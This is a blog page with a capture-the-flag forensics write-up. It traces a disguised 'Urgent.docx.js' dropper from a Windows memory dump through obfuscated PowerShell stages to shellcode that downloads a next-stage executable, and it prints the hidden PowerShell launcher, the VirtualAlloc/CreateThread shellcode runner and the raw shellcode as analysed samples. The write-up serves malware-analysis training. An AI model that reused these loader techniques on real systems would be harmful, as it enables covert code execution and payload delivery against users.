<!doctype html><!-- This site was created with Hugo Blox. https://hugoblox.com --><!-- Last Published: June 22, 2024 --><html lang=en-us dir=ltr data-wc-theme-default=system><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Hugo Blox Builder 0.2.0"><meta name=author content="Duarte Mortágua"><meta name=description content='Writeup for the "Memory and Malware" challenge'><link rel=alternate hreflang=en-us href=http://localhost:1313/blog/get-started/><link rel=stylesheet href=/css/themes/blue.min.css><link href=/dist/wc.min.css rel=stylesheet><script>window.hbb={defaultTheme:document.documentElement.dataset.wcThemeDefault,setDarkTheme:()=>{document.documentElement.classList.add("dark"),document.documentElement.style.colorScheme="dark"},setLightTheme:()=>{document.documentElement.classList.remove("dark"),document.documentElement.style.colorScheme="light"}},console.debug(`Default Hugo Blox Builder theme is ${window.hbb.defaultTheme}`),"wc-color-theme"in localStorage?localStorage.getItem("wc-color-theme")==="dark"?window.hbb.setDarkTheme():window.hbb.setLightTheme():(window.hbb.defaultTheme==="dark"?window.hbb.setDarkTheme():window.hbb.setLightTheme(),window.hbb.defaultTheme==="system"&&(window.matchMedia("(prefers-color-scheme: dark)").matches?window.hbb.setDarkTheme():window.hbb.setLightTheme()))</script><script>document.addEventListener("DOMContentLoaded",function(){let e=document.querySelectorAll("li input[type='checkbox'][disabled]");e.forEach(e=>{e.parentElement.parentElement.classList.add("task-list")});const t=document.querySelectorAll(".task-list li");t.forEach(e=>{let t=Array.from(e.childNodes).filter(e=>e.nodeType===3&&e.textContent.trim().length>1);if(t.length>0){const n=document.createElement("label");t[0].after(n),n.appendChild(e.querySelector("input[type='checkbox']")),n.appendChild(t[0])}})})</script><link rel=icon type=image/png href=/media/icon_hu68170e94a17a2a43d6dcb45cf0e8e589_3079_32x32_fill_lanczos_center_3.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu68170e94a17a2a43d6dcb45cf0e8e589_3079_180x180_fill_lanczos_center_3.png><link rel=canonical href=http://localhost:1313/blog/get-started/><meta property="twitter:card" content="summary_large_image"><meta property="twitter:site" content="@GetResearchDev"><meta property="twitter:creator" content="@GetResearchDev"><meta property="og:site_name" content="Duarte Mortágua"><meta property="og:url" content="http://localhost:1313/blog/get-started/"><meta property="og:title" content="🏆 Memory and Malware Writeup | CSCPT 2024 | Duarte Mortágua"><meta property="og:description" content='Writeup for the "Memory and Malware" challenge'><meta property="og:image" content="http://localhost:1313/blog/get-started/featured.png"><meta property="twitter:image" content="http://localhost:1313/blog/get-started/featured.png"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2024-06-22T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-22T00:00:00+00:00"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/blog/get-started/"},"headline":"🏆 Memory and Malware Writeup | CSCPT 2024","image":["http://localhost:1313/blog/get-started/featured.png"],"datePublished":"2024-06-22T00:00:00Z","dateModified":"2024-06-22T00:00:00Z","author":{"@type":"Person","name":"Duarte Mortágua"},"publisher":{"@type":"Organization","name":"Duarte Mortágua","logo":{"@type":"ImageObject","url":"http://localhost:1313/media/icon_hu68170e94a17a2a43d6dcb45cf0e8e589_3079_192x192_fill_lanczos_center_3.png"}},"description":"Writeup for the \"Memory and Malware\" challenge"}</script><title>🏆 Memory and Malware Writeup | CSCPT 2024 | Duarte Mortágua</title><style>@font-face{font-family:inter var;font-style:normal;font-weight:100 900;font-display:swap;src:url(/dist/font/Inter.var.woff2)format(woff2)}</style><link type=text/css rel=stylesheet href=/dist/pagefind/pagefind-ui.be766eb419317a14ec769d216e9779bfe8f3737c80e780f4ba0dafb57a41a482.css integrity="sha256-vnZutBkxehTsdp0hbpd5v+jzc3yA54D0ug2vtXpBpII="><script src=/dist/pagefind/pagefind-ui.87693d7c6f2b3b347ce359d0ede762c033419f0a32b22ce508c335a81d841f1b.js integrity="sha256-h2k9fG8rOzR841nQ7ediwDNBnwoysizlCMM1qB2EHxs="></script><script>window.hbb.pagefind={baseUrl:"/"}</script><style>html.dark{--pagefind-ui-primary:#eeeeee;--pagefind-ui-text:#eeeeee;--pagefind-ui-background:#152028;--pagefind-ui-border:#152028;--pagefind-ui-tag:#152028}</style><script>window.addEventListener("DOMContentLoaded",e=>{new PagefindUI({element:"#search",showSubResults:!0,baseUrl:window.hbb.pagefind.baseUrl,bundlePath:window.hbb.pagefind.baseUrl+"pagefind/"})}),document.addEventListener("DOMContentLoaded",()=>{let e=document.getElementById("search"),t=document.getElementById("search_toggle");t&&t.addEventListener("click",()=>{if(e.classList.toggle("hidden"),e.querySelector("input").value="",e.querySelector("input").focus(),!e.classList.contains("hidden")){let t=document.querySelector(".pagefind-ui__search-clear");t&&!t.hasAttribute("listenerOnClick")&&(t.setAttribute("listenerOnClick","true"),t.addEventListener("click",()=>{e.classList.toggle("hidden")}))}})})</script><script defer src=/js/hugo-blox-en.min.js integrity></script></head><body class="dark:bg-hb-dark dark:text-white page-wrapper" id=top><div id=page-bg></div><div class=page-header><header id=site-header class=header><nav class="navbar px-3 flex justify-left"><div class="order-0 h-100"><a class=navbar-brand href=/ title="Duarte Mortágua"></a></div><input id=nav-toggle type=checkbox class=hidden>
<label for=nav-toggle class="order-3 cursor-pointer flex items-center lg:hidden text-dark dark:text-white lg:order-1"><svg id="show-button" class="h-6 fill-current block" viewBox="0 0 20 20"><title>Open Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0V0z"/></svg><svg id="hide-button" class="h-6 fill-current hidden" viewBox="0 0 20 20"><title>Close Menu</title><polygon points="11 9 22 9 22 11 11 11 11 22 9 22 9 11 -2 11 -2 9 9 9 9 -2 11 -2" transform="rotate(45 10 10)"/></svg></label><ul id=nav-menu class="navbar-nav order-3 hidden lg:flex w-full pb-6 lg:order-1 lg:w-auto lg:space-x-2 lg:pb-0 xl:space-x-8 justify-left"><li class=nav-item><a class=nav-link href=/>Home</a></li><li class=nav-item><a class=nav-link href=/tags/>Topics</a></li><li class=nav-item><a class=nav-link href=/uses/>Uses</a></li></ul><div class="order-1 ml-auto flex items-center md:order-2 lg:ml-0"><button aria-label=search class="text-black hover:text-primary inline-block px-3 text-xl dark:text-white" id=search_toggle><svg xmlns="http://www.w3.org/2000/svg" height="16" width="16" viewBox="0 0 512 512" fill="currentcolor"><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8.0 45.3s-32.8 12.5-45.3.0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9.0 208S93.1.0 208 0 416 93.1 416 208zM208 352a144 144 0 100-288 144 144 0 100 288z"/></svg></button><div class="px-3 text-black hover:text-primary-700 dark:text-white dark:hover:text-primary-300
[&.active]:font-bold [&.active]:text-black/90 dark:[&.active]:text-white"><button class="theme-toggle mt-1" accesskey=t title=appearance><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="dark:hidden"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="dark:block [&:not(dark)]:hidden"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div></nav></header><div id=search class="hidden p-3"></div></div><div class="page-body my-10"><div class="mx-auto flex max-w-screen-xl"><aside class="hb-sidebar-container max-lg:[transform:translate3d(0,-100%,0)] lg:hidden xl:block"><div class="px-4 pt-4 lg:hidden"></div><div class="hb-scrollbar lg:h-[calc(100vh-var(--navbar-height))]"><ul class="flex flex-col gap-1 lg:hidden"><li class=open><a class="hb-sidebar-custom-link
text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50" href=/blog/>Blog
<span data-hb-sidebar-toggle><svg fill="none" viewBox="0 0 24 24" stroke="currentcolor" class="h-[18px] min-w-[18px] rounded-sm p-0.5 hover:bg-gray-800/5 dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="origin-center transition-transform rtl:-rotate-180"/></svg></span></a><div class="ltr:pr-0 overflow-hidden"><ul class=hb-sidebar-list><li class="flex flex-col open"><a class="hb-sidebar-custom-link
sidebar-active-item bg-primary-100 font-semibold text-primary-800 dark:bg-primary-300 dark:text-primary-900" href=/blog/get-started/>🏆 Memory and Malware Writeup | CSCPT 2024</a><ul class=hb-sidebar-mobile-toc><li><a href=# class=hb-docs-link></a></li></ul></li><li class="flex flex-col"><a class="hb-sidebar-custom-link
text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50" href=/blog/second-brain/>🧠 Sharpen your thinking with a second brain</a></li><li class="flex flex-col"><a class="hb-sidebar-custom-link
text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50" href=/blog/data-visualization/>📈 Communicate your results effectively with the best data visualizations</a></li><li class="flex flex-col"><a class="hb-sidebar-custom-link
text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50" href=/blog/teach-courses/>👩🏼‍🏫 Teach academic courses</a></li><li class="flex flex-col"><a class="hb-sidebar-custom-link
text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50" href=/blog/project-management/>✅ Manage your projects</a></li></ul></div></li><li><a class="hb-sidebar-custom-link
text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-gray-300 dark:hover:bg-primary-800 dark:hover:text-gray-50" href=/uses/>Uses</a></li></ul><div class="max-xl:hidden h-0 w-64 shrink-0"></div></div></aside><nav class="hb-toc order-last hidden w-64 shrink-0 xl:block print:hidden px-4" aria-label="table of contents"><div class="hb-scrollbar text-sm [hyphens:auto] sticky top-16 overflow-y-auto pr-4 pt-6 max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] -mr-4 rtl:-ml-4"><p class="mb-4 font-semibold tracking-tight">On this page</p><ul><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-4 rtl:pr-4 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#memory-and-malware>Memory and Malware</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#challenge>Challenge</a></li><li class="my-2 scroll-my-6 scroll-py-6"><a class="pl-8 rtl:pr-8 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 w-full break-words" href=#solution>Solution</a></li></ul><div class="mt-8 border-t dark:border-neutral-700 pt-8 sticky bottom-0 flex flex-col items-start gap-2 pb-8"><a class="text-xs font-medium text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-100 contrast-more:text-gray-800 contrast-more:dark:text-gray-50" href=https://github.com/HugoBlox/hugo-blox-builder/edit/main/starters/blog/content/blog/get-started/index.md target=_blank rel=noreferer>Edit this page</a></div></div></nav><article class="w-full break-words flex min-h-[calc(100vh-var(--navbar-height))] min-w-0 justify-center pb-8 pr-[calc(env(safe-area-inset-right)-1.5rem)]"><main class="w-full min-w-0 max-w-6xl px-6 pt-4 md:px-12"><h1 class="mt-2 text-4xl font-bold tracking-tight text-slate-900 dark:text-slate-100">🏆 Memory and Malware Writeup | CSCPT 2024</h1><div class="mt-4 mb-16"><div class="text-gray-500 dark:text-gray-300 text-sm flex items-center flex-wrap gap-y-2"><span class=mr-1>Jun 22, 2024</span><span class=mx-1>·</span><div class="group inline-flex items-center text-current gap-x-1.5 mx-1"><img src=/author/duarte-mortagua/avatar_hub2bf15c7dd03b9415eba95030db75eb8_13163_50x50_fill_q95_h2_lanczos_center.webp alt="Duarte Mortágua" class="inline-block h-4 w-4 rounded-full border border-current" loading=lazy><div>Duarte Mortágua</div></div><span class=mx-1>·</span>
<span class=mx-1>9 min read</span></div><div class=mt-3></div></div><div class="article-header article-container featured-image-wrapper mt-4 mb-16" style=max-width:720px;max-height:600px><div style=position:relative><img src=/blog/get-started/featured_hu217ed922764afec3b00d005a748f544a_81955_a62c69f97265fb35cc1c82dc36058800.webp width=720 height=600 alt class=featured-image>
<span class=article-header-caption>Image credit: <a href=https://cdays.2024.cybersecuritychallenge.pt/ target=_blank rel=noopener><strong>CSCPT</strong></a></span></div></div><div class="prose prose-slate lg:prose-xl dark:prose-invert"><p>Welcome 👋</p><details class="print:hidden xl:hidden" open><summary>Table of Contents</summary><div class=text-sm><nav id=TableOfContents><ul><li><ul><li><a href=#memory-and-malware>Memory and Malware</a></li></ul></li></ul></nav></div></details><p>The 10th edition of the <a href=https://www.c-days.cncs.gov.pt/ target=_blank rel=noopener>C-Days</a> cybersecurity conference took place in Coimbra, Portugal, from June 18th to June 20th, 2024. <a href=https://x.com/cyberchallpt target=_blank rel=noopener>CyberChallengePT</a> organized the conference&rsquo;s CTF, which was available during the event at <a href=https://cdays.2024.cybersecuritychallenge.pt/ target=_blank rel=noopener>cdays.2024.cybersecuritychallenge.pt</a>.</p><p>Below is the writeup for the last forensic challenge, &ldquo;Memory and Malware&rdquo;.</p><h3 id=memory-and-malware>Memory and Malware</h3><h4 id=challenge>Challenge</h4><blockquote><p>Um utilizador (CSCPT) descarregou e executou um ficheiro através do seu browser Chrome. Este ficheiro cifrou um ficheiro extremamente sensível localizado em <code>c:\CSCPT\flag.txt</code>, dando origem a um novo ficheiro <code>c:\CSCPT\flag.enc</code>. É necessário analisar o malware, decifrar o ficheiro e obter a flag.</p></blockquote><blockquote><p>NOTA: Embora o malware executado apenas vá cifrar o ficheiro <code>c:\CSCPT\flag.txt</code>, o software de antivírus poderá identificar os artefactos extraídos de memória como maliciosos, pelo que deve ser acedido apenas através de uma máquina virtual devidamente segregada do sistema operativo base.</p></blockquote><blockquote><p><a href=https://dfir.pt/cscpt-2024/ target=_blank rel=noopener>https://dfir.pt/cscpt-2024/</a></p></blockquote><h4 id=solution>Solution</h4><p>The provided file, when extracted, contains a full MS Windows 64bit crash dump (<code>md5sum:98a7c6bfadb52d42e797bc46b20dc675</code>), which can be asserted by running the following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ file WRK01-20240512-195957.dmp
</span></span><span class=line><span class=cl>WRK01-20240512-195957.dmp: MS Windows 64bit crash dump, full dump, <span class=m>1048293</span> pages
</span></span></code></pre></div><p>Volatiliy 3 can be used to extract system information from a crash dump almost like a system image, so we&rsquo;ll use it to search into it and look for the artifacts we need.</p><p>If we&rsquo;re told that we need to analyze the malware, and we know that the malware was downloaded to the machine, we can use Volatility to search within the Downloads folder for suspicious artifacts.</p><p>To do that, we can scan the machine files using the Volatility FileScan plugin:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 vol.py -f <span class=s2>&#34;~/WRK01-20240512-195957.dmp&#34;</span> windows.filescan.FileScan
</span></span></code></pre></div><p>If you search for &ldquo;Downloads&rdquo; in the output, you&rsquo;ll find one suspicious artifact:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>0xe0845f8cacf0	<span class=se>\U</span>sers<span class=se>\C</span>SCPT<span class=se>\D</span>ownloads<span class=se>\u</span>rgent <span class=o>(</span>1<span class=o>)</span>.zip	<span class=m>216</span>
</span></span></code></pre></div><p>Now, we can dump the file using the previously obtained offset and the DumpFiles plugin:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 vol.py -f <span class=s2>&#34;~/WRK01-20240512-195957.dmp&#34;</span> windows.dumpfiles.DumpFiles --virtaddr 0xe0845f8cacf0
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Cache	FileObject	FileName	Result
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>DataSectionObject	0xe0845f8cacf0	urgent <span class=o>(</span>1<span class=o>)</span>.zip	file.0xe0845f8cacf0.0xe084616437d0.DataSectionObject.urgent <span class=o>(</span>1<span class=o>)</span>.zip.dat
</span></span></code></pre></div><p>If you try to extract it you can&rsquo;t, because it&rsquo;s not actually a zip file. If you output its contents you&rsquo;ll obtain the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat file.0xe0845f8cacf0.0xe084616437d0.DataSectionObject.urgent <span class=o>(</span>1<span class=o>)</span>.zip.dat
</span></span><span class=line><span class=cl><span class=o>[</span>ZoneTransfer<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>ZoneId</span><span class=o>=</span><span class=m>3</span>
</span></span><span class=line><span class=cl><span class=nv>HostUrl</span><span class=o>=</span>https://dfir.pt/urgent.zip
</span></span></code></pre></div><p>Hit the link to download the file (<code>md5sum:8e8f34857a5d2e1b5d48baee55c0262e</code>).</p><p>Extract it and you&rsquo;ll get the file <code>Urgent.docx.js</code>. This file contains obfuscated JavaScript content. You can see that in the end there&rsquo;s an <code>ActiveXObject</code>, which is often used to execute arbitrary code. You can also see that the content being passed as the argument to that new object appears to be a PowerShell script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pOWErShElL.ExE<span class=se>\x</span>20-ExecutionPolicy<span class=se>\x</span>20bypass<span class=se>\x</span>20-nOExiT<span class=se>\x</span>20-noPrOfIlE<span class=se>\x</span>20-winDowsTyle<span class=se>\x</span>20hidDEN<span class=se>\x</span>20/e<span class=se>\x</span>20JABzAD0...
</span></span></code></pre></div><p>By replacing the <code>\x20</code> characters with actual spaces, we can see that the code tries to execute a hidden PowerShell console, where the payload starts with <code>JABzAD0...</code>.</p><p>If you decode that payload from Base64 and remove the null characters (using CyberChef for example), you&rsquo;ll get the following PowerShell script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$s</span><span class=p>=</span><span class=nb>New-Object</span> <span class=n>IO</span><span class=p>.</span><span class=py>MemoryStream</span><span class=p>(,[</span><span class=no>Convert</span><span class=p>]::</span><span class=n>FromBase64String</span><span class=p>(</span><span class=s2>&#34;H4sI...AAA==&#34;</span><span class=p>));</span><span class=nb>IEX </span><span class=p>(</span><span class=nb>New-Object</span> <span class=n>IO</span><span class=p>.</span><span class=py>StreamReader</span><span class=p>(</span><span class=nb>New-Object</span> <span class=n>IO</span><span class=p>.</span><span class=py>Compression</span><span class=p>.</span><span class=py>GzipStream</span><span class=p>(</span><span class=nv>$s</span><span class=p>,[</span><span class=no>IO.Compression.CompressionMode</span><span class=p>]::</span><span class=n>Decompress</span><span class=p>))).</span><span class=py>ReadToEnd</span><span class=p>();</span>
</span></span></code></pre></div><p>If you look at the script, you&rsquo;ll see that it decodes another Base64 encoded string and then decompresses it&rsquo;s result using GZip. If you provide the string <code>H4sI...AAA==</code> as input to CyberChef and apply the recipe &ldquo;From Base64&rdquo; > &ldquo;Gunzip&rdquo;, you&rsquo;ll get another PowerShell script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$txtRecord</span> <span class=p>=</span> <span class=p>(</span><span class=nb>Resolve-DnsName</span> <span class=n>-Name</span> <span class=s2>&#34;cscpt.dfir.pt&#34;</span> <span class=n>-Type</span> <span class=n>TXT</span> <span class=n>-Server</span> <span class=s2>&#34;8.8.8.8&#34;</span> <span class=p>|</span> <span class=nb>Select-Object</span> <span class=n>-ExpandProperty</span> <span class=n>Strings</span><span class=p>))</span> <span class=p>{</span> <span class=nb>New-Item</span> <span class=n>-Path</span> <span class=s2>&#34;HKCU:\SOFTWARE\Setec&#34;</span> <span class=n>-Force</span> <span class=p>|</span> <span class=nb>Out-Null</span><span class=p>;</span> <span class=nb>Set-ItemProperty</span> <span class=n>-Path</span> <span class=s2>&#34;HKCU:\SOFTWARE\Setec&#34;</span> <span class=n>-Name</span> <span class=s2>&#34;License&#34;</span> <span class=n>-Value</span> <span class=p>(</span><span class=nv>$txtRecord</span> <span class=n>-join</span> <span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>Byte[]</span><span class=p>]</span> <span class=nv>$hgPLffkJY</span> <span class=p>=</span> <span class=n>0x48</span><span class=p>,</span><span class=n>0x83</span><span class=p>,...,</span><span class=n>0xc4</span><span class=p>,</span><span class=n>0x20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$sljwiiCURtDMX</span> <span class=p>=</span> <span class=nv>$IwaCWYUoftIYXr</span><span class=p>::</span><span class=n>VirtualAlloc</span><span class=p>(</span><span class=mf>0</span><span class=p>,[</span><span class=no>Math</span><span class=p>]::</span><span class=n>Max</span><span class=p>(</span><span class=nv>$hgPLffkJY</span><span class=p>.</span><span class=n>Length</span><span class=p>,</span><span class=n>0x1000</span><span class=p>),</span><span class=n>0x3000</span><span class=p>,</span><span class=n>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>System.Runtime.InteropServices.Marshal</span><span class=p>]::</span><span class=n>Copy</span><span class=p>(</span><span class=nv>$hgPLffkJY</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$sljwiiCURtDMX</span><span class=p>,</span><span class=nv>$hgPLffkJY</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$IwaCWYUoftIYXr</span><span class=p>::</span><span class=n>CreateThread</span><span class=p>(</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$sljwiiCURtDMX</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=mf>0</span><span class=p>)</span>
</span></span></code></pre></div><p>This new script starts by trying to resolve the DNS name &ldquo;cscpt.dfir.pt&rdquo; and obtain it&rsquo;s TXT record value. If it does, it creates the Registry key &ldquo;License&rdquo; with the value of that TXT record in the path &ldquo;HKCU:\SOFTWARE\Setec&rdquo;.</p><p>If you try to retrieve the TXT record manually, you&rsquo;ll see that it is no longer available online.</p><p>Then, it eventually calls the <code>kernel32.dll</code> functions <code>VirtualAlloc</code> and <code>CreateThread</code> in order to run a piece of shellcode, through the contents of the byte array variable <code>$hgPLffkJY</code>.</p><p>In order to dump that shellcode, we can do it dynamically by debugging the script, or statically using Cyberchef. If you provide the bytes <code>0x48,0x83,...,0xc4,0x20</code> as input to CyberChef, delete the &ldquo;0x"s and replace &ldquo;,&rdquo; by " &ldquo;, and then apply the recipe &ldquo;From Hex&rdquo;, you&rsquo;ll get the shellcode:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Hì<span class=o>(</span>HäðH1ÉeHA<span class=sb>`</span>H@Hp H­HH­HX M1ÀDC&lt;LÂHÚH1É±HÑDIØH1öAp HÞH1ÉI¹GetProcAHÿÁH1ÀHØL9uïH1öAp<span class=nv>$H</span>ÞfNH1öApHÞH1ÒHÚH×¹aryAQH¹LoadLibrQHâHÙHì0ÿ×HÄ0HÄHÆH1Àf¸llPH¸urlmon.dPHáHì0ÿÖHÄ@PH1Àf¸eAPH¸oadToFilPH¸URLDownlPHâHL$Hì0ÿ×HÄHPH1ÀH¸WinExec PHâHÙHì<span class=o>(</span>ÿ×HÄ0PH1À¸ess PH¸ExitProcPHâHÙHì<span class=o>(</span>ÿ×HÄ8PH1À°nPH¸cscpt.biPH¸dfir.pt/PH¸https://PTH1ÀH¸2.exe   PH¸<span class=se>\r</span>undll3PH¸SOSharedPH¸amData<span class=se>\U</span>PH¸C:<span class=se>\P</span>rogrPTH1ÀPM1ÉLD$HT<span class=nv>$8</span>H1ÉHì ÿ$   HÄ HÄ<span class=sb>`</span>H1ÀH¸2.exe   PH¸<span class=se>\r</span>undll3PH¸SOSharedPH¸amData<span class=se>\U</span>PH¸C:<span class=se>\P</span>rogrPTH1ÒH<span class=nv>$H</span>ì ÿT<span class=nv>$XH</span>Ä HÄ0H1ÉHì ÿT$ HÄ 
</span></span></code></pre></div><p>We can spot strings such as &ldquo;URLDownloadToFile&rdquo;, &ldquo;cscpt&rdquo;, &ldquo;dfir.pt&rdquo;, &ldquo;2.exe&rdquo;, &ldquo;rundll&rdquo;, &ldquo;C:\ProgramData&rdquo;, etc. These strings suggest that this shellcode downloads a file from &ldquo;dfir.pt&rdquo;, but we can&rsquo;t make much sense of out it, at least statically.</p><p>So I opted to run the shellcode and debug it, in order to find the call to the target URL. To do that, I used the <code>runsc</code> utility by <a href=https://github.com/edygert/runsc/releases/tag/V1.0.0 target=_blank rel=noopener>edygert</a> which loads 32bit or 64bit shellcode in a way that makes it easy to load in a debugger.</p><p>After saving the previous mentioned shellcode to the file <code>shellcode.bin</code>, we can run the following command in a Windows machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=p>&gt;</span> runsc64.exe -f shellcode.bin -n
</span></span></code></pre></div><p>As it doesn&rsquo;t blow up, it means it ran. If you tried this with <code>runsc32.exe</code> (32bit shellcode), you would get the following error: &ldquo;error accessing 0x00000060 not mapped&rdquo;, which suggests that it&rsquo;s probably 64bit shellcode.</p><p>Now that we know it runs, we&rsquo;ll run it as a suspended thread, to give us time to attach to this process with a debugger.</p><p>Open x64dbg, go to &ldquo;File&rdquo; > &ldquo;Attach&rdquo; and attach to the runsc64 process. Then, set a breakpoint on the shellcode address shown by runsc64, by typing <code>SetBPX 0x0000014DE2FF0000</code> in the Command input box. Then, switch back to the runsc64 window and press any key to resume the shellcode thread. You&rsquo;ll notice that x64dbg will pause on the breakpoint set, placing us in the beginning of the shellcode.</p><p>Since we suspect that a file will be downloaded, we can set breakpoints on the <code>CALL</code> instructions that appear in the assembly instuctions, and keep an eye on their registers values.</p><p>When you reach the 6th CALL instruction (000001D0981E01C2), you can see that the function called is <code>urlmon.URLDownloadToFileA</code>, which the arguments are <code>rdx="https://dfir.pt/cscpt.bin"</code> and <code>r8="C:\\ProgramData\\USOShared\\rundll32.exe"</code>.</p><p>This means that our next stage is located at <code>https://dfir.pt/cscpt.bin</code>, which you can download manually.</p><p>The provided file seems to be a PE executable:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ file cscpt.bin
</span></span><span class=line><span class=cl>cscpt.bin: PE32+ executable <span class=o>(</span>console<span class=o>)</span> x86-64, <span class=k>for</span> MS Windows
</span></span></code></pre></div><p>If we rename it in Windows to <code>cscpt.exe</code>, we can see it assumes an icon realted to Python, which may suggest that it was done using Python.</p><p>Let&rsquo;s run <code>pestr</code> in a Linux machine and analyze its strings (greater than 20 characters to avoid noise):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ pestr -n <span class=m>20</span> cscpt.exe &gt; cscpt.exe.pestr
</span></span></code></pre></div><p>The strings include references to Python errors (<code>PyErr_*</code>) and other Python modules, as well as references to <code>cryptography.hazmat.*</code> modules, which is a Python package to perform cryptographic operations. This means that this executable was most likely obtained from Python source code.</p><p>In efforts to obtain the Python source code, I searched &ldquo;exe to python&rdquo; online and came across a StackOverflow thread that suggested that, if the executable was obtained using PyInstaller, obtaining the source code would be as simple as running the <a href=https://sourceforge.net/projects/pyinstallerextractor/ target=_blank rel=noopener>PyInstaller Extractor</a>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 pyinstxtractor.py cscpt.exe
</span></span></code></pre></div><p>The result of this command is the folder <code>cscpt.exe_extracted</code> containing a bunch of <code>pyc</code> files. According to Google, <code>pyc</code> are compiled bytecode files that can be executed directly by the interpreter, but it&rsquo;s still unreadable code. Doing some more search, I discovered that it may be trivial to obtain the Python source code from the <code>pyc</code> files using <a href=https://github.com/rocky/python-uncompyle6/ target=_blank rel=noopener>uncompyle6</a>, a Python bytecode decompiler.</p><p>It can be installed via pip with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 -m pip install uncompyle6
</span></span></code></pre></div><p>Then tried to decompile what appeared to be the main file <code>cscpt.pyc</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ uncompyle6 cscpt.pyc
